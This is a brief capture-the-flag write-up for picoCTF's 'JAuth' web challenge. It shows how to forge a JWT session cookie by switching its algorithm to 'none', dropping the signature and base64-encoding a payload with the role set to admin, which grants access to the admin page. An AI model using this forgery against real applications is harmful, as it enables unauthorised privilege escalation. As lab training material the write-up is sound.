# Challange Info

Name : JAuth

Difficulty : Medium

Category : Web Exploitation

Link : https://play.picoctf.org/practice/challenge/236?category=1&page=1

# Writeup

Logging in using provided credentials in the webapp.

There is a cookie named token which is a JWT.

Decoding the JWT and changing the algorithm from HS256 to none.

```bash
echo -n '{"typ":"JWT","alg":"none"}' | base64
```

> eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=

Remove the = and remove the signature without fullstop at last. 

Edit the cookie with cookie editor.

Extension Link : https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm

The webpage allows none algorithm now in payload change the role to admin.

```bash
echo -n '{"auth":1736323979030,"agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","role":"admin","iat":1736323979}' | base64
```

> eyJhdXRoIjoxNzM2MzIzOTc5MDMwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM2MzIzOTc5fQ==

Remove = and edit the payload in cookie and I got access to admin page which contains the flag. 
